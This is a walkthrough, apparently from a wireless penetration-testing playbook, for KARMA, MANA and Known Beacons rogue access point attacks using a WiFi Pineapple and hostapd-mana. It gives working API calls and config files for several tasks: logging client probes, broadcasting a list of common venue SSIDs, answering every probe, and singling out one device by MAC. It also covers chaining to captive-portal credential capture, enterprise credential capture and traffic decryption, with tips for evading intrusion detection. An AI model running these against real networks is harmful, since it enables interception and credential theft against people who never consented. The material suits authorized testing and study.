# karma-family — walkthrough

Three modes: passive-first (Snoopy / passive log), Known-Beacons
dictionary broadcast, and MANA per-STA. All three coexist with
PineAP where noted.

## Preconditions

- Pineapple Mk VII or a laptop with `hostapd-mana` (patched hostapd).
- Root or scoped API token.
- Optional: SSID dictionary (curated for the venue).

## Path A — Passive baseline (Snoopy-lite)

Least invasive. No transmit; just listen.

```
# Via PineAP API — turn on log_probes, everything else off.
curl -sk -X POST https://172.16.42.1:1471/api/pineap/settings \
  -H "Authorization: Bearer $TOKEN" \
  -d '{ "karma": 0, "log_probes": 1,
        "beacon_response": 0, "broadcast_ssid_pool": 0 }'

# Let it run for 10-20 minutes.
sleep 900

# Dump the probes.
curl -sk https://172.16.42.1:1471/api/pineap/probes \
  -H "Authorization: Bearer $TOKEN" | jq
```

Each row names probing STA + SSID + timestamp. Use this to build
your **SSID pool** for Path B and your **client filter** for Path D.

## Path B — Known Beacons (curated broadcast)

Broadcast a dictionary of common SSIDs. Clients that have any of
them in their PNL auto-associate on passive discovery.

```
# Populate the pool. Common WCTF-attractive SSIDs:
POOL=$(jq -Rn '[
  "attwifi", "xfinitywifi", "GoogleGuest", "Starbucks WiFi",
  "Boingo Hotspot", "hhonors", "Marriott_Guest", "Delta Sky Club",
  "Guest", "Home", "NETGEAR", "linksys", "TPLINK_5G",
  "DEFCON-Open", "Speakeasy"
]')

curl -sk -X POST https://172.16.42.1:1471/api/pineap/ssid_pool \
  -H "Authorization: Bearer $TOKEN" \
  -d "{ \"ssids\": $POOL }"

# Enable broadcast + beacon response, leave karma off.
curl -sk -X POST https://172.16.42.1:1471/api/pineap/settings \
  -H "Authorization: Bearer $TOKEN" \
  -d '{ "beacon_response": 1, "broadcast_ssid_pool": 1, "karma": 0 }'
```

This is the quietest active mode. WIDS sees a normal-looking AP with
an odd SSID rotation but no "responds to every SSID" signal.

## Path C — MANA Loud

Broadcast every SSID you've *seen* probed for. Louder; higher yield.

```
# Rebuild the pool from the passive log.
SEEN=$(curl -sk https://172.16.42.1:1471/api/pineap/probes \
  -H "Authorization: Bearer $TOKEN" \
  | jq '[.[] | .ssid] | unique')

curl -sk -X POST https://172.16.42.1:1471/api/pineap/ssid_pool \
  -H "Authorization: Bearer $TOKEN" \
  -d "{ \"ssids\": $SEEN }"

# Add karma so probes without a matching SSID also succeed.
curl -sk -X POST https://172.16.42.1:1471/api/pineap/settings \
  -H "Authorization: Bearer $TOKEN" \
  -d '{ "karma": 1, "broadcast_ssid_pool": 1, "beacon_response": 1 }'
```

## Path D — Target-of-one (MANA per-STA via hostapd-mana)

PineAP doesn't do true per-STA scoping. Fall back to `hostapd-mana`:

```
apt install hostapd-mana

cat > /tmp/mana.conf <<EOF
interface=wlan1
driver=nl80211
ssid=Placeholder     # overwritten per-response by MANA
hw_mode=g
channel=6
enable_mana=1
mana_loud=0          # per-STA mode
mana_wpe=0           # or 1 for combined WPE inner-EAP capture
EOF

hostapd-mana /tmp/mana.conf
```

Gate to a specific target with the filter:

```
# In hostapd-mana.conf or via patched config:
mana_macacl=allow
mana_macfile=/tmp/target-macs.txt
```

## Path E — Chain to captive portal / rogue RADIUS

Once a client associates via any karma-family path, chain to the
next layer:

- Open pool → captive portal cred capture
  (`captive-portal/walkthrough.md`).
- WPA2-Enterprise pool → hostapd-wpe on the back end
  (`enterprise/walkthrough.md`).
- WPA2-PSK pool with a known PSK → 4-way handshake decrypt for
  passive traffic reading (`post-crack-rf/walkthrough.md`).

## Failure modes

- **No client probes.** Modern iOS/Android rarely emit directed
  probes. Use Known Beacons (Path B) — passive discovery still
  catches on a matching beacon SSID.
- **WIDS trips.** Raw KARMA is the loudest; MANA Loud is nearly as
  loud. Drop to Known Beacons + per-STA MANA.
- **Client associates but no traffic.** Some clients wait for the
  captive-portal probe URL to return an expected response. Make
  sure your DNS + HTTP mirror those probe endpoints (see
  `captive-portal/walkthrough.md`).

## Cite

- SensePost 2014 — MANA.
- Etizaz Mohsin / Bastille Networks 2017–2018 — Known Beacons.
- Wilkinson 2012 — Snoopy.
- Hak5 — PineAP module docs.
- attacks.json: `mana-karma`, `mana-loud`, `mana-known-beacons`,
  `pineap-passive-probe-log`, `pineap-active-karma`,
  `pineap-ssid-pool-broadcast`.
- karma_family.json.
